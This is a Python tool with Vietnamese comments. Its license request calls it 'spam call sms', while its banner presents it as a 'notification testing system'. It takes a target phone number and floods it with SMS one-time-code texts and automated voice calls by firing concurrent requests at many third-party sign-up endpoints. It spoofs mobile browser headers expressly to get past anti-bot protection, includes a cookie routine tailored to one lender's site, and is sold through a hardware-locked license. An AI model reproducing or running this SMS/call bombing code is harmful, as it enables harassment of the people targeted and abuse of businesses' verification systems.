import os
import sys
import json
import time
import hashlib
import platform
import subprocess
import logging
from typing import Dict, List, Any
from urllib.parse import urlparse
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ==========================================
# CẤU HÌNH HỆ THỐNG LICENSE (BẢN QUYỀN)
# ==========================================
SERVER_URL = "https://shopvietx.io.vn/api/license"
KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")

# ==========================================
# CẤU HÌNH LOGGING GỌN GÀNG CHO MÔI TRƯỜNG PE
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="[%H:%M:%S]",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("MatrixCloudEngine")

class CloudTestingEngine:
    def __init__(self):
        self.timeout = 10 
        self.api_database = self.load_apis_from_memory()

    def load_apis_from_memory(self) -> Dict[str, List[Any]]:
        """Đọc dữ liệu từ bộ nhớ RAM (globals), nếu không thấy thì tự động nạp từ file apis_config.json cục bộ"""
        if 'IN_MEMORY_DB' in globals():
            return globals()['IN_MEMORY_DB']
        
        # Tự động tìm kiếm file cấu hình cục bộ để chạy độc lập (Standalone) ổn định
        config_file = "apis_config.json"
        if os.path.exists(config_file):
            try:
                with open(config_file, "r", encoding="utf-8") as f:
                    logger.info("[✓] Đang nạp cơ sở dữ liệu từ file apis_config.json cục bộ...")
                    return json.load(f)
            except Exception as e:
                logger.error(f"[!] Lỗi khi đọc file apis_config.json cục bộ: {str(e)}")
        
        logger.error("[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM hoặc file cục bộ!")
        return {"sms_endpoints": [], "call_endpoints": []}

    def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
        """Hàm gửi Request độc lập trên từng luồng bằng Session riêng biệt để tránh ô nhiễm dữ liệu chéo"""
        name = api.get("name", "Dịch vụ ẩn danh")
        url = api.get("url", "")
        method = api.get("method", "POST").upper()
        
        # Khởi tạo Session biệt lập hoàn toàn cho mỗi luồng worker nhằm tránh xung đột đa luồng
        worker_session = requests.Session()
        retries = Retry(
            total=1,
            backoff_factor=0.1,
            status_forcelist=[500, 502, 503, 504],
            raise_on_status=False
        )
        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=retries)
        worker_session.mount("http://", adapter)
        worker_session.mount("https://", adapter)

        phone_no_zero = phone[1:] if phone.startswith("0") else phone
        phone_84 = "84" + phone_no_zero
        
        raw_template = api.get("payload_template", "")
        formatted_payload = raw_template.replace("{phone}", phone)\
                                         .replace("{phone_no_zero}", phone_no_zero)\
                                         .replace("{phone_84}", phone_84)

        # Cấu hình bộ Headers giả lập trình duyệt di động chuẩn để tăng tỷ lệ bypass WAF/Anti-bot
        default_headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        # Trộn cấu hình headers mặc định với headers tùy chỉnh từ file cấu hình JSON
        api_headers = api.get("headers", {})
        headers = {**default_headers, **api_headers}
        
        # Tự động chuẩn hóa và bổ sung Referer/Origin dựa theo URL mục tiêu nếu bị thiếu
        if url:
            parsed = urlparse(url)
            base_origin = f"{parsed.scheme}://{parsed.netloc}"
            if 'origin' not in {k.lower() for k in headers.keys()} and method == "POST":
                headers['origin'] = base_origin
            if 'referer' not in {k.lower() for k in headers.keys()}:
                headers['referer'] = f"{base_origin}/"

        try:
            # XỬ LÝ ĐẶC BIỆT DÀNH RIÊNG CHO CỔNG VAYXANH (BÊ NGUYÊN CƠ CHẾ CỦA FILE 6.PY VÀO THÀNH CÔNG)
            if "vayxanh" in url.lower() or "vayxanh" in name.lower():
                base_url = "https://lk.vayxanh.com"
                headers.update({
                    'accept': 'application/json, text/plain, */*',
                    'origin': base_url,
                    'referer': f'{base_url}/?phone={phone}&amount=2000000&term=7',
                    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin'
                })
                worker_session.headers.update(headers)
                
                # Bước 1: Khởi tạo phiên (Init Session) để lấy Set-Cookie từ trang chủ
                init_url = f"{base_url}/"
                init_params = {
                    "phone": phone,
                    "amount": "2000000",
                    "term": "7",
                    "utm_source": "direct_vayxanh",
                    "utm_medium": "organic",
                    "utm_campaign": "direct_vayxanh",
                    "utm_content": "mainpage_submit"
                }
                logger.info(f"[▶ INIT] Đang đồng bộ phiên Cookie VayXanh cho {phone}...")
                worker_session.get(init_url, params=init_params, timeout=self.timeout)
                
                # Bước 1.5: Khởi chạy cơ chế Fallback gọi API config nội bộ nếu chưa bắt được _cabinet_key
                cookies_dict = requests.utils.dict_from_cookiejar(worker_session.cookies)
                if "_cabinet_key" not in cookies_dict:
                    config_url = f"{base_url}/internal/client/config"
                    worker_session.get(config_url, timeout=self.timeout)
            else:
                worker_session.headers.update(headers)

            # Đóng gói dữ liệu Data hoặc JSON payload
            if api.get("is_json"):
                request_kwargs = {"json": json.loads(formatted_payload)}
            else:
                request_kwargs = {"data": formatted_payload}

            logger.info(f"[▶ RUNNING] Đang kiểm thử cổng: {name}")

            response = worker_session.request(
                method=method,
                url=url,
                timeout=self.timeout,
                **request_kwargs
            )
            
            if response.status_code == 200:
                logger.info(f"  └── [✓ SUCCESS] {name} thành công.")
                return True
            else:
                logger.info(f"  └── [✕ FAILED] {name} phản hồi không chuẩn (Mã: {response.status_code}).")
                return False

        except requests.exceptions.Timeout:
            logger.info(f"  └── [🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.")
        except Exception as e:
            logger.info(f"  └── [✕ ERROR] Không thể kết nối tới {name}. Chi tiết: {str(e)}")
        
        return False

    def trigger_sms_suite(self, phone: str) -> None:
        """Kích hoạt bắn đồng thời Suite SMS bằng đa luồng độc lập cực nhanh"""
        sms_list = self.api_database.get("sms_endpoints", [])
        if not sms_list:
            print("[-] Danh sách API trống hoặc nạp từ RAM/File thất bại.")
            return

        print(f"\n[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...")
        print("-" * 55)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in sms_list]
            concurrent.futures.wait(futures)
            
        print("-" * 55)
        print("[✓] Hoàn tất Suite SMS.")

    def trigger_combined_suite(self, phone: str) -> None:
        """Kịch bản tích hợp: SMS trước, Call (IVR) ở cuối quy trình với luồng biệt lập"""
        self.trigger_sms_suite(phone)
        
        time.sleep(1.5)
        
        call_list = self.api_database.get("call_endpoints", [])
        if not call_list:
            return

        print(f"\n[+] Khởi chạy Suite IVR: Đang thực thi {len(call_list)} cuộc gọi thoại...")
        print("-" * 55)
        
        # Loại bỏ hoàn toàn hàm sync_ivr_cookies dùng chung cũ, luồng VayXanh giờ tự xử lý phiên độc lập bên trong worker
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in call_list]
            concurrent.futures.wait(futures)
            
        print("-" * 55)
        print("[✓] Hoàn tất toàn bộ chuỗi tích hợp.")


# ==========================================
# CẤU HÌNH HỆ THỐNG QUẢN LÝ MÃ MÁY & LICENSE
# ==========================================
def get_hardware_id() -> str:
    """Tự động lấy mã định danh phần cứng duy nhất (Mã máy) tùy thuộc vào OS"""
    current_os = platform.system().lower()
    raw_id = "UNKNOWN_DEVICE"
    
    try:
        if current_os == "windows":
            cmd = "wmic csproduct get uuid"
            output = subprocess.check_output(cmd, shell=True).decode().split()
            if len(output) >= 2:
                raw_id = output[1]
        elif current_os == "linux":
            if os.path.exists("/etc/machine-id"):
                with open("/etc/machine-id", "r") as f:
                    raw_id = f.read().strip()
            elif os.path.exists("/var/lib/dbus/machine-id"):
                with open("/var/lib/dbus/machine-id", "r") as f:
                    raw_id = f.read().strip()
    except Exception:
        pass

    return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()


def verify_license_key(key: str, hardware_id: str) -> bool:
    """Gửi yêu cầu xác thực Key và Mã máy lên Server ShopVietX"""
    try:
        payload = {"license_key": key, "hwid": hardware_id, "tool": "spam call sms"}
        response = requests.post(SERVER_URL, json=payload, timeout=8)
        if response.status_code == 200:
            res_data = response.json()
            if res_data.get("status") == "success" or res_data.get("active") is True:
                return True
    except Exception:
        pass
    return False


def check_authentication_flow():
    """Luồng kiểm tra bản quyền nghiêm ngặt trước khi cho phép dùng Tool"""
    hw_id = get_hardware_id()
    
    if os.path.exists(KEY_FILE_PATH):
        with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
            saved_key = f.read().strip()
        if saved_key and verify_license_key(saved_key, hw_id):
            return True 
            
    while True:
        os.system("cls" if platform.system().lower() == "windows" else "clear")
        print("=" * 64)
        print("         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       ")
        print("=" * 64)
        print(f"  [!] Trạng thái: Chưa kích hoạt bản quyền!")
        print(f"  • Mã máy (HWID) của bạn: {hw_id}")
        print("  • Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.")
        print("-" * 64)
        
        user_key = input("[?] Nhập Key bản quyền của bạn (Hoặc bấm '0' để thoát): ").strip()
        
        if user_key == "0":
            print("[+] Đóng chương trình.")
            sys.exit(0)
            
        if not user_key:
            continue
            
        print("[+] Đang kiểm tra mã khóa trên hệ thống Server...")
        if verify_license_key(user_key, hw_id):
            with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
                f.write(user_key)
            print("[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...")
            time.sleep(1.5)
            return True
        else:
            print("[-] Lỗi: Key không hợp lệ, đã hết hạn hoặc không dùng cho máy này!")
            input("\n[Nhấn Enter để thử lại...]")


def show_banner_introduction():
    """Hiển thị phần giới thiệu thông tin công cụ sau khi đã qua bước check key"""
    os.system("cls" if platform.system().lower() == "windows" else "clear")
    hw_id = get_hardware_id()
    
    print("=" * 64)
    print("         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          ")
    print("   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) ")
    print("=" * 64)
    print(f"  • Phiên bản: Cloud Integration v3.5 (Chạy trên RAM)")
    print(f"  • Hệ điều hành: {platform.system()} {platform.release()}")
    print(f"  • Mã máy của bạn: {hw_id}")
    print(f"  • Trạng thái bản quyền: Đã kích hoạt [✓]")
    print("=" * 64)


def render_terminal_menu():
    print("\n" + "═"*20 + " MENU ĐIỀU KHIỂN CHÍNH " + "═"*20)
    print("  [1] Chỉ thực thi Suite SMS (SMS Only)")
    print("  [2] Chạy toàn diện tích hợp (SMS + Call)")
    print("  [0] Giải phóng bộ nhớ & Thoát chương trình")
    print("═"*64)


def run_application():
    check_authentication_flow()
    show_banner_introduction()
    core_engine = CloudTestingEngine()
    
    while True:
        render_terminal_menu()
        cmd = input("[?] Nhập tùy chọn lệnh (0-2): ").strip()
        
        if cmd == "0":
            print("[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng hệ thống!")
            break
        elif cmd in ["1", "2"]:
            phone = input("[?] Nhập số điện thoại mục tiêu cần test: ").strip()
            if not phone or len(phone) < 9 or not phone.isdigit():
                print("[-] Lỗi: Số điện thoại không đúng định dạng chuỗi số!")
                continue
                
            if cmd == "1":
                core_engine.trigger_sms_suite(phone)
            elif cmd == "2":
                core_engine.trigger_combined_suite(phone)
                
            input("\n[Nhấn nút Enter để tiếp tục...]")
        else:
            print("[-] Mã lệnh không hợp lệ!")

if __name__ == "__main__":
    run_application()
